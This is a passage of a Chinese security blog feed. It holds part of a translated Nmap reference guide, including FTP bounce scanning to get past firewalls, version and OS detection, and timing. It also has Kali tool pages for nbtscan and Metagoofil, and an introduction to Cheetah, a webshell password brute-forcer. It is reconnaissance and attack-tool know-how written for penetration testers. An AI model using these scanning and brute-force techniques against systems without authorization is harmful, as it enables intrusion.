是支持所谓代理ftp连接。它允许用户连接到一台FTP服务器，然后要求文件送到一台第三方服务器。 这个特性在很多层次上被滥用，所以许多服务器已经停止支持它了。其中一种就是导致FTP服务器对其它主机端口扫描。 只要请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口。 错误消息会描述端口是开放还是关闭的。 这是绕过防火墙的好方法，因为FTP服务器常常被置于可以访问比Web主机更多其它内部主机的位置。 Nmap用-b选项支持ftp弹跳扫描。参数格式是<username>:<password>@<server>:<port>。<server>是某个脆弱的FTP服务器的名字或者IP地址。 您也许可以省略<username>:<password>， 如果服务器上开放了匿名用户(user:anonymous password:-wwwuser@)。 端口号(以及前面的冒号) 也可以省略，如果<server>使用默认的FTP端口(21)。</server></password></username></server></port></server></password></username></p><p>当Nmap1997年发布时，这个弱点被广泛利用，但现在大部分已经被fix了。 脆弱的服务器仍然存在，所以如果其它都失败了，这也值得一试。 如果您的目标是绕过防火墙，扫描目标网络上的开放的21端口(或者 甚至任何ftp服务，如果您用版本探测扫描所有端口)， 然后对每个尝试弹跳扫描。Nmap会告诉您该主机脆弱与否。 如果您只是试着玩Nmap，您不必(事实上，不应该)限制您自己。 在您随机地在互联网上寻找脆弱的FTP服务器时，考虑一下系统管理员不太喜欢您这样滥用他们的服务器。</p><h1 id="端口说明和扫描顺序"><a href="#端口说明和扫描顺序" class="headerlink" title="端口说明和扫描顺序"></a>端口说明和扫描顺序</h1><p>除了所有前面讨论的扫描方法， Nmap提供选项说明那些端口被扫描以及扫描是随机还是顺序进行。 默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描。</p><p><strong>-p<port ranges="">(只扫描指定的端口)</port></strong></p><p>该选项指明您想扫描的端口，覆盖默认值。 单个端口和用连字符表示的端口范围(如 1-1023)都可以。 范围的开始以及/或者结束值可以被省略， 分别导致Nmap使用1和65535。所以您可以指定 -p-从端口1扫描到65535。 如果您特别指定，也可以扫描端口0。 对于IP协议扫描(-sO)，该选项指定您希望扫描的协议号 (0-255)。</p><p>当既扫描TCP端口又扫描UDP端口时，您可以通过在端口号前加上T: 或者U:指定协议。 协议限定符一直有效您直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。注意，要既扫描 UDP又扫描TCP，您必须指定 -sU ，以及至少一个TCP扫描类型(如 -sS，-sF，或者 -sT)。如果没有给定协议限定符， 端口号会被加到所有协议列表。</p><p><strong>-F (快速 (有限的端口) 扫描)</strong></p><p>在nmap的nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口。 这比扫描所有65535个端口快得多。 因为该列表包含如此多的TCP端口(1200多)，这和默认的TCP扫描 scan (大约1600个端口)速度差别不是很大。如果您用–datadir选项指定您自己的 小小的nmap-services文件 ，差别会很惊人。</p><p><strong>-r (不要按随机顺序扫描端口)</strong></p><p>默认情况下，Nmap按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。这种随机化通常都是受欢迎的， 但您也可以指定-r来顺序端口扫描。</p><h1 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h1><p>把Nmap指向一个远程机器，它可能告诉您 端口25/tcp，80/tcp，和53/udp是开放的。使用包含大约2,200个著名的服务的 nmap-services数据库， Nmap可以报告那些端口可能分别对应于一个邮件服务器 (SMTP)，web服务器(HTTP)，和域名服务器(DNS)。 这种查询通常是正确的 – 事实上，绝大多数在TCP端口25监听的守护进程是邮件 服务器。然而，您不应该把赌注押在这上面! 人们完全可以在一些奇怪的端口上运行服务。</p><p>即使Nmap是对的，假设运行服务的确实是 SMTP，HTTP和DNS，那也不是特别多的信息。 当为您的公司或者客户作安全评估(或者甚至简单的网络明细清单)时， 您确实想知道正在运行什么邮件和域名服务器以及它们的版本。 有一个精确的版本号对了解服务器有什么漏洞有巨大帮助。 版本探测可以帮您获得该信息。</p><p>在用某种其它类型的扫描方法发现TCP 和/或者UDP端口后， 版本探测会询问这些端口，确定到底什么服务正在运行。 nmap-service-probes 数据库包含查询不同服务的探测报文 和解析识别响应的匹配表达式。 Nmap试图确定服务协议 (如 ftp，ssh，telnet，http)，应用程序名(如ISC Bind，Apache httpd，Solaris telnetd)，版本号， 主机名，设备类型(如 打印机，路由器)，操作系统家族 (如Windows，Linux)以及其它的细节，如 如是否可以连接X server，SSH协议版本 ，或者KaZaA用户名)。当然，并非所有服务都提供所有这些信息。 如果Nmap被编译成支持OpenSSL， 它将连接到SSL服务器，推测什么服务在加密层后面监听。 当发现RPC服务时， Nmap RPC grinder (-sR)会自动被用于确定RPC程序和它的版本号。 如果在扫描某个UDP端口后仍然无法确定该端口是开放的还是被过滤的，那么该端口状态就 被标记为open|filtered。 版本探测将试图从这些端口引发一个响应(就像它对开放端口做的一样)， 如果成功，就把状态改为开放。 open|filtered TCP端口用同样的方法对待。 注意Nmap -A选项在其它情况下打开版本探测。 有一篇关于版本探测的原理，使用和定制的文章在<a href="http://www.insecure.org/nmap/vscan/" target="_blank" rel="external">http://www.insecure.org/nmap/vscan/</a>。</p><p>当Nmap从某个服务收到响应，但不能在数据库中找到匹配时， 它就打印一个特殊的fingerprint和一个URL给您提交，如果您确实知道什么服务运行在端口。 请花两分钟提交您的发现，让每个人受益。由于这些提交， Nmap有350种以上协议如smtp，ftp，http等的大约3，000条模式匹配。</p><p>用下列的选项打开和控制版本探测：</p><p><strong>-sV (版本探测)</strong></p><p>打开版本探测。 您也可以用-A同时打开操作系统探测和版本探测。</p><p><strong>–allports (不为版本探测排除任何端口)</strong></p><p>默认情况下，Nmap版本探测会跳过9100 TCP端口，因为一些打印机简单地打印送到该端口的 任何数据，这回导致数十页HTTP get请求，二进制 SSL会话请求等等被打印出来。这一行为可以通过修改或删除nmap-service-probes 中的Exclude指示符改变， 您也可以不理会任何Exclude指示符，指定–allports扫描所有端口</p><p><strong>–version-intensity<intensity>(设置 版本扫描强度)</intensity></strong></p><p>当进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值。 被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文 一般没什么用。强度水平说明了应该使用哪些探测报文。数值越高， 服务越有可能被正确识别。 然而，高强度扫描花更多时间。强度值必须在0和9之间。 默认是7。当探测报文通过nmap-service-probes ports指示符 注册到目标端口时，无论什么强度水平，探测报文都会被尝试。这保证了DNS 探测将永远在任何开放的53端口尝试， SSL探测将在443端口尝试，等等。</p><p><strong>–version-light (打开轻量级模式)</strong></p><p>这是 –version-intensity 2的方便的别名。轻量级模式使 版本扫描快许多，但它识别服务的可能性也略微小一点。</p><p><strong>–version-all (尝试每个探测)</strong></p><p>–version-intensity 9的别名， 保证对每个端口尝试每个探测报文。</p><p><strong>–version-trace (跟踪版本扫描活动)</strong></p><p>这导致Nmap打印出详细的关于正在进行的扫描的调试信息。 它是您用–packet-trace所得到的信息的子集。</p><p><strong>-sR (RPC扫描)</strong></p><p>这种方法和许多端口扫描方法联合使用。 它对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，如果是， 是什么程序和版本号。因此您可以有效地获得和<strong>rpcinfo -p</strong>一样的信息， 即使目标的端口映射在防火墙后面(或者被TCP包装器保护)。Decoys目前不能和RPC scan一起工作。 这作为版本扫描(-sV)的一部分自动打开。 由于版本探测包括它并且全面得多，-sR很少被需要。</p><h1 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h1><p>Nmap最著名的功能之一是用TCP/IP协议栈fingerprinting进行远程操作系统探测。 Nmap发送一系列TCP和UDP报文到远程主机，检查响应中的每一个比特。 在进行一打测试如TCP ISN采样，TCP选项支持和排序，IPID采样，和初始窗口大小检查之后， Nmap把结果和数据库nmap-os-fingerprints中超过 1500个已知的操作系统的fingerprints进行比较，如果有匹配，就打印出操作系统的详细信息。 每个fingerprint包括一个自由格式的关于OS的描述文本， 和一个分类信息，它提供供应商名称(如Sun)，下面的操作系统(如Solaris)，OS版本(如10)， 和设备类型(通用设备，路由器，switch，游戏控制台， 等)。</p><p>如果Nmap不能猜出操作系统，并且有些好的已知条件(如 至少发现了一个开放端口和一个关闭端口)，Nmap会提供一个 URL，如果您确知运行的操作系统，您可以把fingerprint提交到那个URL。 这样您就扩大了Nmap的操作系统知识库，从而让每个Nmap用户都受益。</p><p>操作系统检测可以进行其它一些测试，这些测试可以利用处理 过程中收集到的信息。例如运行时间检测，使用TCP时间戳选项(RFC 1323) 来估计主机上次重启的时间，这仅适用于提供这类信息的主机。另一种 是TCP序列号预测分类，用于测试针对远程主机建立一个伪造的TCP连接 的可能难度。这对于利用基于源IP地址的可信关系(rlogin，防火墙过滤等) 或者隐含源地址的攻击非常重要。这一类哄骗攻击现在很少见，但一些 主机仍然存在这方面的漏洞。实际的难度值基于统计采样，因此可能会有 一些波动。通常采用英国的分类较好，如“worthy challenge”或者 “trivial joke”。在详细模式(-v)下只以 普通的方式输出，如果同时使用-O，还报告IPID序列产生号。 很多主机的序列号是“增加”类别，即在每个发送包的IP头中 增加ID域值， 这对一些先进的信息收集和哄骗攻击来说是个漏洞。</p><p><a href="https://nmap.org/book/osdetect.html" target="_blank" rel="external">https://nmap.org/book/osdetect.html</a>文档使用多种语言描述了版本检测的方式、使用和定制。</p><p>采用下列选项启用和控制操作系统检测:</p><p><strong>-O (启用操作系统检测)</strong></p><p>也可以使用-A来同时启用操作系统检测和版本检测。</p><p><strong>–osscan-limit (针对指定的目标进行操作系统检测)</strong></p><p>如果发现一个打开和关闭的TCP端口时，操作系统检测会更有效。 采用这个选项，Nmap只对满足这个条件的主机进行操作系统检测，这样可以 节约时间，特别在使用-P0扫描多个主机时。这个选项仅在使用 -O或-A 进行操作系统检测时起作用。</p><p><strong>–osscan-guess; –fuzzy (推测操作系统检测结果)</strong></p><p>当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配，使用上述任一个选项使得Nmap的推测更加有效。</p><h1 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h1><p>Nmap开发的最高优先级是性能。在本地网络对一个主机的默认扫描(nmap<hostname>)需要1/5秒。而仅仅眨眼的 时间，就需要扫描上万甚至几十万的主机。此外，一些特定的扫描选项会明显增 加扫描时间，如UDP扫描和版本检测。同样，防火墙配置以及特殊的响应速度限制也会 增加时间。Nmap使用了并行算法和许多先进的算法来加速扫描，用户对Nmap如何 工作有最终的控制权。高级用户可以仔细地调整Nmap命令，在满足时间要求的同时获得他们所关心的信息。</hostname></p><p>改善扫描时间的技术有：忽略非关键的检测、升级最新版本的Nmap(性能增强不断改善)。 优化时间参数也会带来实质性的变化，这些参数如下。</p><p><strong>–min-hostgroup<milliseconds>; –max-hostgroup<milliseconds>(调整并行扫描组的大小)</milliseconds></milliseconds></strong></p><p>Nmap具有并行扫描多主机端口或版本的能力，Nmap将多个目标IP地址 空间分成组，然后在同一时间对一个组进行扫描。通常，大的组更有效。缺 点是只有当整个组扫描结束后才会提供主机的扫描结果。如果组的大小定义 为50，则只有当前50个主机扫描结束后才能得到报告(详细模式中的补充信息 除外)。</p><p>默认方式下，Nmap采取折衷的方法。开始扫描时的组较小， 最小为5，这样便于尽快产生结果；随后增长组的大小，最大为1024。确切的 大小依赖于所给定的选项。为保证效率，针对UDP或少量端口的TCP扫描，Nmap 使用大的组。</p><p>–max-hostgroup选项用于说明使用最大的组，Nmap不会超出这个大小。–min-hostgroup选项说明最小的组，Nmap 会保持组大于这个值。如果在指定的接口上没有足够的目标主机来满足所 指定的最小值，Nmap可能会采用比所指定的值小的组。这两个参数虽然很少使用， 但都用于保持组的大小在一个指定的范围之内。</p><p>这些选项的主要用途是说明一个最小组的大小，使得整个扫描更加快速。通常 选择256来扫描C类网段。对于端口数较多的扫描，超出该值没有意义。对于 端口数较少的扫描，2048或更大的组大小是有帮助的。</p><p><strong>–min-parallelism<milliseconds>; –max-parallelism<milliseconds>(调整探测报文的并行度)</milliseconds></milliseconds></strong></p><p>这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。默认状态下， Nmap基于网络性能计算一个理想的并行度，这个值经常改变。如果报文被丢弃， Nmap降低速度，探测报文数量减少。随着网络性能的改善，理想的探测报文数量会缓慢增加。 这些选项确定这个变量的大小范围。默认状态下，当网络不可靠时，理想的并行度值 可能为1，在好的条件下，可能会增长至几百。</p><p>最常见的应用是–min-parallelism值大于1，以加快 性能不佳的主机或网络的扫描。这个选项具有风险，如果过高则影响准确度，同时 也会降低Nmap基于网络条件动态控制并行度的能力。这个值设为10较为合适， 这个值的调整往往作为最后的手段。</p><p>–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文，和选择–scan-delay同时使用非常有用，虽然 这个选项本身的用途已经很好。</p><p><strong>–min-rtt-timeout<milliseconds>， –max-rtt-timeout<milliseconds>， –initial-rtt-timeout<milliseconds>(调整探测报文超时)</milliseconds></milliseconds></milliseconds></strong></p><p>Nmap使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新 发送探测报文。Nmap基于上一个探测报文的响应时间来计算超时值，如果网络延迟比较显著 和不定，这个超时值会增加几秒。初始值的比较保守(高)，而当Nmap扫描无响应 的主机时，这个保守值会保持一段时间。</p><p>这些选项以毫秒为单位，采用小的–max-rtt-timeout值，使 –initial-rtt-timeout值大于默认值可以明显减少扫描时间，特别 是对不能ping通的扫描(-P0)以及具有严格过滤的网络。如果使用太 小的值，使得很多探测报文超时从而重新发送，而此时可能响应消息正在发送，这使得整个扫描的时 间会增加。</p><p>如果所有的主机都在本地网络，对于–max-rtt-timeout值来 说，100毫秒比较合适。如果存在路由，首先使用ICMP ping工具ping主机，或使用其 它报文工具如hpings，可以更好地穿透防火墙。查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。通常，不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000ms。</p><p>–min-rtt-timeout这个选项很少使用，当网络不可靠时， Nmap的默认值也显得过于强烈，这时这个选项可起作用。当网络看起来不可靠时，Nmap仅将 超时时间降至最小值，这个情况是不正常的，需要向nmap-dev邮件列表报告bug。</p><p><strong>–host-timeout<milliseconds>(放弃低速目标主机)</milliseconds></strong></p><p>由于性能较差或不可靠的网络硬件或软件、带宽限制、严格的防火墙等原因， 一些主机需要很长的时间扫描。这些极少数的主机扫描往往占 据了大部分的扫描时间。因此，最好的办法是减少时间消耗并且忽略这些主机，使用 –host-timeout选项来说明等待的时间(毫秒)。通常使用1800000 来保证Nmap不会在单个主机上使用超过半小时的时间。需要注意的是，Nmap在这半小时中可以 同时扫描其它主机，因此并不是完全放弃扫描。超时的主机被忽略，因此也没有针对该主机的 端口表、操作系统检测或版本检测结果的输出。</p><p><strong>–scan-delay<milliseconds>; –max-scan-delay<milliseconds>(调整探测报文的时间间隔)</milliseconds></milliseconds></strong></p><p>这个选项用于Nmap控制针对一个主机发送探测报文的等待时间(毫秒)，在带宽 控制的情况下这</p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> reference </tag>
            
            <tag> guide </tag>
            
            <tag> nmap </tag>
            
            <tag> nmap参考指南 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之nbtscan-unixwiz]]></title>
      <url>/2017/04/24/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bnbtscan-unixwiz/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>一个在本地或远程TCP/IP网络上扫描开放的NETBIOS名称服务器的命令行工具。它基于Windows系统的nbtstat工具的功能实现，但它可在许多地址上运行，而不是仅一个地址。</p><a id="more"></a><p><a href="http://unixwiz.net/tools/nbtscan.html" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/nbtscan-unixwiz.git;a=tree;h=refs/heads/kali/master;hb=refs/heads/kali/master" target="_blank" rel="external">仓库</a></p><ul><li>作者：Steve Friedl</li><li>证书：public-domain</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>NBTSCAN-unixwiz - 开放NETBIOS名称服务器扫描器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">root@kali:~# nbtscan-unixwiz</div><div class="line">nbtscan 1.0.35 - 2008-04-08 - http://www.unixwiz.net/tools/</div><div class="line"></div><div class="line">用法: nbtscan-unixwiz [选项] 目标 [目标...]</div><div class="line"></div><div class="line">   目标可以是IP地址，DNS名称或地址的列表范围。</div><div class="line">   范围可以表示成“192.168.12.0/24”或“192.168.12.64-97”</div><div class="line"></div><div class="line">   -V        显示版本信息</div><div class="line">   -f        显示完整的NBT资源记录响应(推荐)</div><div class="line">   -H        生成HTTP请求头</div><div class="line">   -v        开启详细输出调试</div><div class="line">   -n        不查找响应IP地址的反向名称</div><div class="line">   -p &lt;n&gt;    绑定UDP端口(默认0)</div><div class="line">   -m        响应中包含MAC地址 (等同&apos;-f&apos;)</div><div class="line">   -T &lt;n&gt;    超时不响应 (默认2秒)</div><div class="line">   -w &lt;n&gt;    次写入后等待秒数 (默认10ms)</div><div class="line">   -t &lt;n&gt;    每个地址尝试次数(默认1次)</div><div class="line">   -P        以perl的hashref格式生成结果</div></pre></td></tr></table></figure><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>扫描一系列IP地址（192.168.0.100-110），而不进行反向名称查找（-n）：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# nbtscan-unixwiz -n 192.168.0.100-110</div><div class="line">192.168.0.105   WORKGROUP\RETROPIE              SHARING</div><div class="line">*timeout (normal end of scan)</div></pre></td></tr></table></figure><p></p><p>扫描单个IP地址（192.168.0.38）并显示完整的NBT资源记录响应（-f）：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~# nbtscan-unixwiz -f 192.168.0.38</div><div class="line">192.168.0.38    WORKGROUP\DOOKOSSEL             SHARING</div><div class="line">  DOOKOSSEL      &lt;00&gt; UNIQUE Workstation Service</div><div class="line">  DOOKOSSEL      &lt;03&gt; UNIQUE Messenger Service&lt;3&gt;</div><div class="line">  DOOKOSSEL      &lt;20&gt; UNIQUE File Server Service</div><div class="line">  ..__MSBROWSE__.&lt;01&gt; GROUP  Master Browser</div><div class="line">  WORKGROUP      &lt;00&gt; GROUP  Domain Name</div><div class="line">  WORKGROUP      &lt;1d&gt; UNIQUE Master Browser</div><div class="line">  WORKGROUP      &lt;1e&gt; GROUP  Browser Service Elections</div><div class="line">  00:00:00:00:00:00   ETHER</div></pre></td></tr></table></figure><p></p><p>视频演示：<a href="https://asciinema.org/a/104243" target="_blank" rel="external">https://asciinema.org/a/104243</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> enumeration </tag>
            
            <tag> nbtscan-unixwiz </tag>
            
            <tag> netbios </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Metagoofil]]></title>
      <url>/2017/04/24/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BMetagoofil/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>Metagoofil是一种搜索提取目标公司公开文档（pdf，doc，xls，ppt，docx，pptx，xlsx）中元数据的信息收集工具。</p><p>Metagoofil将在Google中进行搜索，以将文档识别并下载到本地磁盘，然后将使用不同的库（如Hachoir，PdfMiner）提取元数据，通过分析得到结果生成具有用户名，软件版本和服务器或机器名称的报告，有助于渗透测试人员信息收集阶段的工作。</p><p>“MetaGooFil”也是信息收集过程中可以利用的优秀软件，由开发The Harvester的团队编写而成，可用来提取元数据（metadata）。元数据经常被定义为是关于数据的数据。在我们创建文档时，例如Word或PowerPoint演示文稿，额外的数据也会被同时创建，并储存在文档里。这些数据通常是对该文档的描述信息，包括文件名、文件大小、作者或创建者的用户名，以及文件保存的位置或路径。这个过程全自动进行，无需用户输入或干预。</p><p>攻击者若能读取到这些信息，就能对目标公司的用户名、系统名、文件共享以及其他诸多好东西有独特的见解。MetaGooFil就是这么一个工具，能在互联网上搜索属于目标的文档。一旦有所发现，MetaGooFil就会把这些文档下载下来，并尝试提取有用的元数据。</p><a id="more"></a><p><a href="http://www.edge-security.com/metagoofil.php" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/metagoofil.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Christian Martorella</li><li>证书：GPLv2</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>metagoofil - 用于提取公共文档元数据的工具<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">root@kali:~# metagoofil</div><div class="line"></div><div class="line">******************************************************</div><div class="line">*     /\/\   ___| |_ __ _  __ _  ___   ___  / _(_) | *</div><div class="line">*    /    \ / _ \ __/ _` |/ _` |/ _ \ / _ \| |_| | | *</div><div class="line">*   / /\/\ \  __/ || (_| | (_| | (_) | (_) |  _| | | *</div><div class="line">*   \/    \/\___|\__\__,_|\__, |\___/ \___/|_| |_|_| *</div><div class="line">*                         |___/                      *</div><div class="line">* Metagoofil Ver 2.2                                 *</div><div class="line">* Christian Martorella                               *</div><div class="line">* Edge-Security.com                                  *</div><div class="line">* cmartorella_at_edge-security.com                   *</div><div class="line">******************************************************</div><div class="line"></div><div class="line"> 用法: metagoofil [选项]</div><div class="line"></div><div class="line">         -d: 目标域名</div><div class="line">         -t: 下载文件的类型 (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx)</div><div class="line">         -l: 限制搜索结果数量 (默认 200)</div><div class="line">         -h: 分析目录中的文档 (值为&quot;yes&quot;进行本地分析)</div><div class="line">         -n: 限制下载文件数量</div><div class="line">         -o: 工作目录 (保存下载文件目录)</div><div class="line">         -f: 输出文件</div><div class="line"></div><div class="line"> 示例:</div><div class="line">  metagoofil.py -d apple.com -t doc,pdf -l 200 -n 50 -o applefiles -f results.html</div><div class="line">  metagoofil.py -h yes -o applefiles -f results.html (本地目录分析)</div></pre></td></tr></table></figure><p></p><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>搜索PDF文件（-t pdf），搜索100个结果（-l 100），下载25个文件（-n 25），目标域（-d kali.org）中的文档，将下载保存到目录（-o kalipdf），并将输出保存到文件（-f kalipdf.html）：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">root@kali:~# metagoofil -d kali.org -t pdf -l 100 -n 25 -o kalipdf -f kalipdf.html</div><div class="line"></div><div class="line">******************************************************</div><div class="line">*     /\/\   ___| |_ __ _  __ _  ___   ___  / _(_) | *</div><div class="line">*    /    \ / _ \ __/ _` |/ _` |/ _ \ / _ \| |_| | | *</div><div class="line">*   / /\/\ \  __/ || (_| | (_| | (_) | (_) |  _| | | *</div><div class="line">*   \/    \/\___|\__\__,_|\__, |\___/ \___/|_| |_|_| *</div><div class="line">*                         |___/                      *</div><div class="line">* Metagoofil Ver 2.2                                 *</div><div class="line">* Christian Martorella                               *</div><div class="line">* Edge-Security.com                                  *</div><div class="line">* cmartorella_at_edge-security.com                   *</div><div class="line">******************************************************</div><div class="line">[&apos;pdf&apos;]</div><div class="line"></div><div class="line">[-] Starting online search...</div><div class="line"></div><div class="line">[-] Searching for pdf files, with a limit of 100</div><div class="line">        Searching 100 results...</div><div class="line">Results: 21 files found</div><div class="line">Starting to download 25 of them:</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> recon </tag>
            
            <tag> reporting </tag>
            
            <tag> enumeration </tag>
            
            <tag> metagoofil </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Webshell密码极速爆破工具-cheetah]]></title>
      <url>/2017/04/24/Webshell%E5%AF%86%E7%A0%81%E6%9E%81%E9%80%9F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7-cheetah/</url>
      <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Cheetah是一款基于字典的webshell密码爆破工具，Cheetah的工作原理是能根据自动探测出的web服务设置相关参数一次性提交大量的探测密码进行爆破，爆破效率是其他普通webshell密码暴力破解工具上千倍。</p><p>项目地址：<a href="https://github.com/sunnyelf/cheetah" target="_blank" rel="external">https://github.com/sunnyelf/cheetah</a></p><a id="more"></a><h1 id="0x01-特点"><a href="#0x01-特点" class="headerlink" title="0x01 特点"></a>0x01 特点</h1><ul><li>速度极快</li><li>支持批量爆破</li><li>自动伪造请求</li><li>自动探测web服务设置相关参数</li><li>支持读取和去重超大密码字典文件</li><li>支持python 2.x和3.x</li><li>目前支持php、jsp、asp、aspx webshell</li></ul><h1 id="0x02-参数说明"><a href="#0x02-参数说明" class="headerlink" title="0x02 参数说明"></a>0x02 参数说明</h1><pre><code>_________________________________________________
       ______              _____         ______
__________  /_ _____ _____ __  /_______ ____  /_
_  ___/__  __ \_  _ \_  _ \_  __/_  __ \ __  __ \
/ /__  _  / / //  __//  __// /_  / /_/ / _  / / /
\___/  / / /_/ \___/ \___/ \__/  \____/  / / /_/
      /_/                               /_/

a very fast brute force webshell password tool.

usage: cheetah.py [-h] [-i] [-v] [-c] [-up] [-r] [-w] [-s] [-n] [-u] [-b]
                   [-p [file [file ...]]]

可选参数:
  -h, --help            显示帮助信息并退出
  -i, --info            显示程序信息并退出
  -v, --verbose         启用详细输出模式(默认禁用)
  -c, --clear           去重字典文件(默认禁用)
  -up, --update         更新cheetah
  -r , --request        指定请求方式(默认POST方式)
  -t , --time           指定请求间隔时间(默认0秒)
  -w , --webshell       指定webshell类型(默认自动探测)
  -s , --server         指定web服务器名称(默认自动探测)
  -n , --number         指定一次请求参数数量(默认自动设置)
  -u , --url            指定webshell url地址
  -b , --url-file       指定批量webshell urls文件
  -p   file [file ...]  指定多个字典文件(默认使用data/pwd.list)

使用示例:
  python cheetah.py -u http://orz/orz.php
  python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v
  python cheetah.py -u http://orz/orz.asp -r get -c -p pwd.list
  python cheetah.py -u http://orz/orz -w aspx -s apache -n 1000
  python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v
</code></pre><h1 id="0x03-下载使用"><a href="#0x03-下载使用" class="headerlink" title="0x03 下载使用"></a>0x03 下载使用</h1><pre><code>git clone https://github.com/sunnyelf/cheetah.git
python cheetah.py 
</code></pre><h1 id="0x04-文件说明"><a href="#0x04-文件说明" class="headerlink" title="0x04 文件说明"></a>0x04 文件说明</h1><pre><code>cheetah:
│  .codeclimate.yml
│  .gitignore
│  .travis.yml
│  cheetah.py             主程序
│  LICENSE
│  README.md
│  README_zh.md
│  update.py              更新模块
│
├─data
│      big_shell_pwd.7z   高效shell大字典
│      pwd.list           默认指定字典文件
│      url.list           默认指定批量webshell url文件
│      user-agent.list    用户代理文件
│
└─images
        1.png
        2.png
        3.png
        4.png
        logo.jpg
